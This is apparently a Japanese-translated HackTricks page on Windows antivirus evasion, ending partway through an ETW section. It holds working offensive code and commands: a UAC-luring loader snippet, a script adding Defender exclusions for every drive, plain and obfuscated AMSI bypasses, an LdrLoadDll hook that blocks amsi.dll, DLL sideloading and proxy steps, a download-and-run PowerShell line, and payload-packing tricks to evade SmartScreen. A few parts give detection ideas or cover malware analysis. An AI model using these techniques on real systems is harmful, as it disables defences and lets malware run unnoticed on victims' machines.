# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**このページは当初** [**@m2rc_p**](https://twitter.com/m2rc_p)**によって書かれました!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender の動作を停止するツール。
- [no-defender](https://github.com/es3n1n/no-defender): 別の AV を偽装して Windows Defender の動作を停止するツール。
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Defender を改変する前のインストーラー風 UAC 釣り餌

ゲームチートを装う公開ローダーは、署名なしの Node.js/Nexe インストーラーとして配布されることが多く、最初に**ユーザーに昇格を要求し**、その後で Defender を無効化します。流れは単純です:

1. `net session` で管理者コンテキストを確認する。このコマンドは呼び出し元が admin 権限を持つ場合にのみ成功するため、失敗はローダーが標準ユーザーとして実行されていることを示します。
2. 直ちに `RunAs` verb で自分自身を再起動し、元のコマンドラインを保持したまま、想定どおりの UAC 承認プロンプトを表示させます。
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
被害者はすでに「cracked」softwareをインストールしていると思い込んでいるため、このプロンプトは通常受け入れられ、malwareにDefenderのpolicyを変更するのに必要な権限が与えられます。

### すべてのドライブ文字に対する一括 `MpPreference` exclusions

権限昇格後、GachiLoader-style chainsはサービスを完全に無効化するのではなく、Defenderの盲点を最大化します。loaderはまずGUI watchdog (`taskkill /F /IM SecHealthUI.exe`) を終了し、その後 **極めて広範なexclusions** を適用して、すべてのuser profile、system directory、removable diskがスキャン不能になります:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- このループはマウントされているすべてのファイルシステム（D:\、E:\、USB sticks など）を走査するため、**ディスク上のどこに将来 payload が置かれても無視されます**。
- `.sys` 拡張子の除外は将来を見据えたもので、攻撃者は後で Defender を再度触らずに unsigned drivers を読み込む選択肢を確保しています。
- すべての変更は `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` 配下に保存されるため、後続の段階で除外設定が維持されていることを確認したり、UAC を再び発火させずに拡張したりできます。

Defender service は停止されないため、単純な health checks は引き続き「antivirus active」と報告しますが、real-time inspection はそれらのパスに一切触れません。

## **AV Evasion Methodology**

現在、AVs はファイルが malicious かどうかを確認するために、static detection、dynamic analysis、さらに高度な EDRs では behavioural analysis など、さまざまな方法を使っています。

### **Static detection**

Static detection は、binary や script 内の既知の malicious strings や byte 配列にフラグを立てることで実現され、さらに file 自体から情報（例: file description、company name、digital signatures、icon、checksum など）を抽出します。つまり、既知の public tools を使うと、すでに解析され malicious としてフラグ付けされている可能性が高いため、より簡単に検知されるかもしれません。この種の検知を回避する方法はいくつかあります。

- **Encryption**

binary を encrypt すれば、AV があなたのプログラムを検知する方法はなくなりますが、メモリ上でそのプログラムを decrypt して実行する loader が別途必要になります。

- **Obfuscation**

場合によっては、binary や script のいくつかの strings を変更するだけで AV をすり抜けられますが、何を obfuscate したいかによっては時間のかかる作業になります。

- **Custom tooling**

自作の tools を開発すれば、既知の bad signatures は存在しませんが、その分かなりの時間と労力が必要です。

> [!TIP]
> Windows Defender の static detection を確認する良い方法は [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) です。これは基本的に file を複数の segment に分割し、それぞれを Defender に個別に scan させます。これにより、binary 内のどの strings や bytes がフラグ付けされているのかを正確に特定できます。

実践的な AV Evasion については、この [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) をぜひ確認することを強くおすすめします。

### **Dynamic analysis**

Dynamic analysis とは、AV が binary を sandbox 内で実行し、malicious activity（例: browser の passwords を decrypt して読む、LSASS に minidump を実行する、など）を監視することです。この部分は少し扱いが難しいですが、sandbox を回避するためにできることはいくつかあります。

- **Sleep before execution** 実装方法によっては、AV の dynamic analysis を bypass する非常に有効な方法になります。AV はユーザーの作業を妨げないよう、file を scan する時間が非常に短いため、長い sleep を使うと binary の分析を妨げられます。問題は、多くの AV の sandbox では、実装方法によっては sleep を単にスキップできることです。
- **Checking machine's resources** 通常、Sandboxes は非常に限られた resources（例: < 2GB RAM）で動作します。そうしないとユーザーの machine を遅くしてしまうからです。ここではさらに工夫できます。たとえば CPU の温度や fan speeds を確認するなど、sandbox に実装されていない項目をチェックできます。
- **Machine-specific checks** 対象の user の workstation が "contoso.local" domain に join されている場合、computer の domain をチェックして指定したものと一致するか確認できます。一致しない場合は、program を終了させられます。

Microsoft Defender の Sandbox computername は HAL9TH なので、detonation 前に malware 内で computer name をチェックできます。名前が HAL9TH と一致すれば Defender の sandbox 内にいることを意味するため、program を終了させられます。

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandboxes に対抗するための [@mgeeky](https://twitter.com/mariuszbit) の他の非常に有用な tips

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

この post で前に述べたように、**public tools** は最終的に **検知される** ので、自分にこう問いかけるべきです。

たとえば、LSASS を dump したいとして、**本当に mimikatz を使う必要がありますか**？ それとも、より知られていない別の project で、同じく LSASS を dump できるものが使えますか。

正しい答えは、おそらく後者です。mimikatz を例に取ると、AVs や EDRs によって最もフラグ付けされている malware の一つ、場合によっては最もフラグ付けされているものかもしれません。project 自体は非常に優れていますが、AVs を回避するために扱うのは悪夢のように大変なので、達成したいことに対する代替手段を探すだけで十分です。

> [!TIP]
> evasion のために payloads を改変する際は、defender で **automatic sample submission を必ずオフ** にし、そして、長期的に evasion を達成したいのであれば、真面目に **VIRUSTOTAL に絶対にアップロードしないでください**。特定の AV で payload が検知されるか確認したいなら、VM にインストールし、automatic sample submission をオフにできるならオフにして、結果に満足するまでそこで test してください。

## EXEs vs DLLs

可能であれば、evasion には常に **DLLs の使用を優先**してください。私の経験では、DLL files は通常 **はるかに検知されにくく**、分析もされにくいので、場合によっては検知を避けるための非常に سادهな trick です（もちろん、payload が DLL として実行される何らかの方法を持っている場合ですが）。

この image でわかるように、Havoc の DLL payload は antiscan.me での detection rate が 4/26 ですが、EXE payload は 7/26 です。

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

ここからは、DLL files を使ってより stealthy にするための trick をいくつか紹介します。

## DLL Sideloading & Proxying

**DLL Sideloading** は、loader が使う DLL search order を利用し、victim application と malicious payload(s) を並べて配置する手法です。

[Siofra](https://github.com/Cybereason/siofra) と以下の powershell script を使って、DLL Sideloading の影響を受けやすい programs を確認できます:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
このコマンドは、"C:\Program Files\\" 内で DLL hijacking の影響を受けやすいプログラムの一覧と、それらが読み込もうとする DLL ファイルを出力します。

私は **DLL Hijackable/Sideloadable なプログラムを自分で調べる** ことを強くおすすめします。この手法は、適切に行えばかなり stealthy ですが、公開されている既知の DLL Sideloadable プログラムを使うと、簡単に見つかる可能性があります。

悪意ある DLL を、プログラムが読み込むと想定している名前で配置するだけでは payload は読み込まれません。なぜなら、そのプログラムはその DLL 内に特定の関数を期待しているからです。この問題を解決するために、**DLL Proxying/Forwarding** と呼ばれる別の手法を使います。

**DLL Proxying** は、プログラムが proxy（および malicious）DLL に対して行う呼び出しを元の DLL に forward することで、プログラムの機能を維持しつつ、payload の実行を処理できるようにします。

私は [@flangvik](https://twitter.com/Flangvik/) の [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) プロジェクトを使用します。

以下が私が行った手順です:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
最後のコマンドで2つのファイルが得られる: DLLのソースコードテンプレートと、元の名前を変更したDLL。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
これらが結果です:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

私たちのshellcode（[SGN](https://github.com/EgeBalci/sgn)でエンコード済み）とproxy DLLの両方が、[antiscan.me](https://antiscan.me)で0/26のDetection rateでした！これは成功と言っていいでしょう。

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) のDLL Sideloadingについての解説と、さらに詳しく学ぶために [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) を**強くおすすめ**します。

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules can export functions that are actually "forwarders": instead of pointing to code, the export entry contains an ASCII string of the form `TargetDll.TargetFunc`. When a caller resolves the export, the Windows loader will:

- `TargetDll` が KnownDLL の場合、保護された KnownDLLs 名前空間（例: ntdll, kernelbase, ole32）から提供される
- `TargetDll` が KnownDLL でない場合、通常のDLL検索順序が使われ、forward 解決を行うモジュールのディレクトリも含まれる

これにより、間接的な sideloading の primitive が可能になります。つまり、署名済みDLLの中から、KnownDLL ではないモジュール名へ forward された関数を export しているものを見つけ、その署名済みDLLを、forward 先のターゲットモジュール名とまったく同じ名前の attacker-controlled DLL と同じ場所に置きます。forwarded export が呼び出されると、loader はその forward を解決して同じディレクトリからあなたのDLLを読み込み、DllMain を実行します。

Windows 11 で観測された例:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` は KnownDLL ではないため、通常の検索順序で解決される。

PoC（コピー＆ペースト）:
1) 署名済みのシステム DLL を書き込み可能なフォルダにコピーする
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 同じフォルダに悪意のある `NCRYPTPROV.dll` を配置する。最小限の DllMain だけでコード実行を得るのに十分であり、DllMain を起動するために forward された関数を実装する必要はない。
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) 署名済みの LOLBin で forward をトリガーする:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed) は side-by-side の `keyiso.dll` (signed) を読み込む
- `KeyIsoSetAuditingInterface` を解決中に、loader は forward を `NCRYPTPROV.SetAuditingInterface` へたどる
- その後 loader は `C:\test` から `NCRYPTPROV.dll` を読み込み、その `DllMain` を実行する
- `SetAuditingInterface` が実装されていない場合、"missing API" error は `DllMain` がすでに実行された後にだけ表示される

Hunting tips:
- target module が KnownDLL ではない forwarded exports に注目する。KnownDLLs は `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` に列挙されている。
- forwarded exports は次のような tooling で列挙できる:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 候補を検索するには Windows 11 forwarder inventory を参照: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- LOLBins（例: rundll32.exe）が non-system paths から署名付き DLL を読み込み、その後同じディレクトリから同じ base name の non-KnownDLLs を読み込むのを監視する
- 次のような process/module chain に対してアラートを出す: `rundll32.exe` → non-system `keyiso.dll` → user-writable paths 配下の `NCRYPTPROV.dll`
- code integrity policies（WDAC/AppLocker）を適用し、application directories で write+execute を禁止する

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Freeze を使って、stealthy な方法で shellcode を load して execute できます。
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion は単なる cat & mouse game で、今日効くものが明日には検知されることもあるため、1つのツールだけに頼らないでください。可能なら、複数の evasion techniques を組み合わせてみてください。

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDR はしばしば `ntdll.dll` の syscall stubs に **user-mode inline hooks** を仕掛けます。これらのフックを回避するには、正しい **SSN** (System Service Number) を読み込んで、フックされた export entrypoint を実行せずに kernel mode へ移行する **direct** または **indirect** syscall stubs を生成できます。

**Invocation options:**
- **Direct (embedded)**: 生成された stub 内に `syscall`/`sysenter`/`SVC #0` 命令を埋め込む (`ntdll` export にヒットしない)。
- **Indirect**: `ntdll` 内に既存の `syscall` gadget へジャンプし、kernel への移行が `ntdll` から始まったように見せる (heuristic evasion に有用)；**randomized indirect** は呼び出しごとに pool から gadget を選ぶ。
- **Egg-hunt**: ディスク上に静的な `0F 05` opcode sequence を埋め込まないようにし、runtime で syscall sequence を解決する。

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: stub bytes を読む代わりに、syscall stubs を virtual address 順に並べて SSN を推測する。
- **SyscallsFromDisk**: クリーンな `\KnownDlls\ntdll.dll` を map し、その `.text` から SSN を読み取ってから unmap する (in-memory hooks をすべて回避)。
- **RecycledGate**: stub が clean な場合は VA ソートによる SSN 推測と opcode validation を組み合わせ、hook されている場合は VA 推測へ fallback する。
- **HW Breakpoint**: `syscall` 命令に DR0 を設定し、VEH を使って runtime で `EAX` から SSN を取得する。hook された bytes を解析せずに済む。

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI は "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" を防ぐために作られました。最初期の AV は **ディスク上のファイル** しかスキャンできなかったので、何らかの方法でペイロードを **直接メモリ上で実行** できれば、AV にはそれを防ぐ手段がありませんでした。十分な可視性がなかったからです。

AMSI 機能は、Windows の以下のコンポーネントに統合されています。

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

これにより、antivirus ソリューションは script の内容を、暗号化されておらず難読化もされていない形で公開させることで、script の挙動を検査できます。

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` を実行すると、Windows Defender では次のアラートが表示されます。

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:` が先頭に付与され、その後に script が実行された executable の path が続くことに注目してください。この例では powershell.exe です。

ファイルをディスクに drop してはいませんが、AMSI により in-memory で検知されました。

さらに、**.NET 4.8** 以降では、C# code も AMSI を通して実行されます。これは in-memory execution のために `Assembly.Load(byte[])` を使う場合にも影響します。そのため、AMSI を evasion したいなら、in-memory execution には低いバージョンの .NET（4.7.2 以下など）を使うことが推奨されます。

AMSI を回避する方法はいくつかあります。

- **Obfuscation**

AMSI は主に静的検知に基づいて動作するため、読み込もうとする script を変更することは、検知を回避する良い方法になりえます。

しかし、AMSI には複数層の obfuscation があっても script を復元する能力があるため、どのように行うかによっては obfuscation は悪い選択肢になりえます。そのため、回避はそれほど単純ではありません。ただし、場合によっては変数名をいくつか変更するだけで十分なこともあるので、どれだけフラグが立っているか次第です。

- **AMSI Bypass**

AMSI は powershell（および cscript.exe、wscript.exe など）の process に DLL を読み込むことで実装されているため、権限のないユーザーとして実行していても簡単に tamper できます。この AMSI 実装の欠陥により、研究者たちは AMSI scanning を回避する複数の方法を見つけています。

**Forcing an Error**

AMSI initialization を失敗させる（amsiInitFailed）と、現在の process では scan は開始されません。これは元々 [Matt Graeber](https://twitter.com/mattifestation) によって公開され、Microsoft はより広く使われるのを防ぐための signature を開発しました。
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
1行の powershell code だけで、現在の powershell process で AMSI を使用不能にできた。もちろんこの 1 行は AMSI 自身によってフラグ付けされるため、この technique を使うには何らかの modification が必要になる。

ここでは、この [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) から取った modified AMSI bypass を示す。
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
これが公開されると、おそらくフラグされるので、もし検知されないことを目的にしているなら、コードは公開しないでください。

**Memory Patching**

この technique は最初に [@RastaMouse](https://twitter.com/_RastaMouse/) によって発見されました。これは、amsi.dll 内の "AmsiScanBuffer" function の address を見つけ（ユーザーが入力した内容をスキャンする役割）、それを `E_INVALIDARG` を返す instruction に書き換えるものです。これにより、実際の scan の result は 0 を返し、clean result として解釈されます。

> [!TIP]
> より詳しい説明については、[https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) を読んでください。

Powershell で AMSI を bypass するために使われる他の technique も多数あります。詳細は [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) と [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) を確認してください。

### amsi.dll の load を防ぐことで AMSI を block する (LdrLoadDll hook)

AMSI は `amsi.dll` が current process に load された後にのみ initialised されます。堅牢で language-agnostic な bypass としては、`ntdll!LdrLoadDll` に user-mode hook を置き、要求された module が `amsi.dll` の場合に error を返す方法があります。その結果、AMSI は決して load されず、その process では scan も発生しません。

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- PowerShell、WScript/CScript、カスタム loader をまたいで動作する（本来 AMSI を読み込むものなら何でも）。
- stdin 経由で script を渡す（`PowerShell.exe -NoProfile -NonInteractive -Command -`）と、長い command-line の痕跡を避けられる。
- LOLBins 経由で実行される loader で使われることがある（例: `regsvr32` が `DllRegisterServer` を呼ぶ）。

ツール **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** も AMSI を bypass する script を生成する。  
ツール **[https://amsibypass.com/](https://amsibypass.com/)** も AMSI を bypass する script を生成し、randomized user-defined function、variables、characters expression を使って signature を回避し、さらに PowerShell keywords に random な文字 casing を適用して signature を回避する。

**検出された signature を削除する**

**[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** と **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** のような tool を使って、現在の process の memory から検出された AMSI signature を削除できる。この tool は、現在の process の memory をスキャンして AMSI signature を探し、見つかったものを NOP instructions で上書きすることで、memory から実質的に削除する。

**AMSI を使用する AV/EDR products**

AMSI を使用する AV/EDR products の一覧は **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** で確認できる。

**Powershell version 2 を使う**
PowerShell version 2 を使うと AMSI は読み込まれないため、AMSI にスキャンされずに script を実行できる。次のようにできる:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging は、システム上で実行されたすべての PowerShell コマンドをログに記録できる機能です。これは監査やトラブルシューティングに役立ちますが、**検出を回避したい攻撃者にとっては問題**にもなりえます。

PowerShell logging をバイパスするには、次のテクニックを使えます。

- **Disable PowerShell Transcription and Module Logging**: この目的で [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) のようなツールを使えます。
- **Use Powershell version 2**: PowerShell version 2 を使うと AMSI はロードされないため、AMSI にスキャンされずにスクリプトを実行できます。次のようにできます: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) を使って、defenses なしで powershell を起動します（これが Cobal Strike の `powerpick` が使うものです）。


## Obfuscation

> [!TIP]
> いくつかの obfuscation テクニックはデータの暗号化に依存しており、その結果バイナリの entropy が増加します。これにより AV や EDR が検出しやすくなります。これには注意し、機密性が高い、または隠す必要があるコードの特定のセクションにのみ暗号化を適用することを検討してください。

### Deobfuscating ConfuserEx-Protected .NET Binaries

ConfuserEx 2（または商用 fork）を使う malware を分析する場合、decompilers や sandboxes を妨害する複数の保護層に遭遇するのが一般的です。以下のワークフローは、後から dnSpy や ILSpy などのツールで C# に decompile できる、ほぼ元の IL を確実に **復元** します。

1.  Anti-tampering removal – ConfuserEx はすべての *method body* を暗号化し、*module* の static constructor (`<Module>.cctor`) 内で復号します。これは PE checksum もパッチするため、変更するとバイナリはクラッシュします。**AntiTamperKiller** を使って暗号化された metadata tables を特定し、XOR keys を復元して、クリーンな assembly を書き直します:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
出力には 6 つの anti-tamper パラメータ（`key0-key3`, `nameHash`, `internKey`）が含まれており、自作の unpacker を作る際に役立ちます。

2.  Symbol / control-flow recovery – *clean* ファイルを **de4dot-cex**（de4dot の ConfuserEx 対応 fork）に渡します。
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 プロファイルを選択
• de4dot は control-flow flattening を解除し、元の namespaces、classes、variable names を復元し、定数文字列を復号します。

3.  Proxy-call stripping – ConfuserEx は direct method calls を軽量な wrapper（*proxy calls*）に置き換えて、decompilation をさらに困難にします。**ProxyCall-Remover** でそれらを削除します:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
このステップの後は、`Class8.smethod_10` のような不明瞭な wrapper functions の代わりに、`Convert.FromBase64String` や `AES.Create()` のような通常の .NET API が見えるはずです。

4.  Manual clean-up – 結果の binary を dnSpy で実行し、巨大な Base64 blobs や `RijndaelManaged`/`TripleDESCryptoServiceProvider` の使用を検索して、*real* payload を特定します。多くの場合 malware はそれを `<Module>.byte_0` 内で初期化される TLV-encoded byte array として保存しています。

上記の chain により、悪意あるサンプルを実行することなく execution flow を復元できます。offline workstation で作業する際に有用です。

> 🛈  ConfuserEx は `ConfusedByAttribute` という custom attribute を生成します。これは sample の自動 triage 用の IOC として使えます。

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): このプロジェクトの目的は、[LLVM](http://www.llvm.org/) コンパイルスイートのオープンソース版フォークを提供し、[code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) と改ざん防止によってソフトウェアのセキュリティを向上させることです。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator は、外部ツールを使わず、コンパイラも変更せずに、`C++11/14` 言語を使ってコンパイル時に obfuscated code を生成する方法を示します。
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming フレームワークによって生成された obfuscated operations の層を追加し、アプリケーションを crack しようとする人の作業を少し難しくします。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz は x64 binary obfuscator で、.exe、.dll、.sys を含むさまざまな pe files を obfuscate できます
- [**metame**](https://github.com/a0rtega/metame): Metame は任意の executables 向けのシンプルな metamorphic code engine です。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator は、ROP (return-oriented programming) を使った LLVM-supported languages 向けの細粒度 code obfuscation framework です。ROPfuscator は、通常の instructions を ROP chains に変換することで assembly code レベルでプログラムを obfuscate し、通常の control flow に対する自然な認識を打ち破ります。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt は Nim で書かれた .NET PE Crypter です
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor は既存の EXE/DLL を shellcode に変換し、その後それらを読み込むことができます

## SmartScreen & MoTW

インターネットからいくつかの executables をダウンロードして実行したときに、この画面を見たことがあるかもしれません。

Microsoft Defender SmartScreen は、潜在的に悪意のある applications の実行からエンドユーザーを保護するための security mechanism です。

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen は主に reputation-based approach で動作し、あまり一般的でない download applications が SmartScreen を発動させ、エンドユーザーに警告して file の実行を防ぎます（ただし、More Info -> Run anyway をクリックすれば、引き続き file を実行できます）。

**MoTW** (Mark of The Web) は、ダウンロード元の URL とともにインターネットから files をダウンロードした際に自動的に作成される、Zone.Identifier という名前の [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) です。

<figure><img src="../images/image (237).png" alt=""><figcaption><p>インターネットからダウンロードした file の Zone.Identifier ADS を確認しているところ。</p></figcaption></figure>

> [!TIP]
> **trusted** な signing certificate で署名された executables は **SmartScreen を発動しない** ことに注意してください。

payloads に Mark of The Web が付かないようにする非常に効果的な方法は、ISO のような何らかの container の中にそれらをパッケージ化することです。これは、Mark-of-the-Web (MOTW) は **non NTFS** volumes には **適用できない** ためです。

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) は、Mark-of-the-Web を回避するために payloads を output containers にパッケージ化する tool です。

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
SmartScreenを回避するために、[PackMyPayload](https://github.com/mgeeky/PackMyPayload/) を使って payload を ISO ファイル内にパッケージ化するデモです。

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) は、Windows における強力なログ機構で、アプリケーションやシステムコンポーネントが **イベントを記録** できるようにします。ただし、セキュリティ製品が悪意ある活動を監視・検知するためにも利用できます。

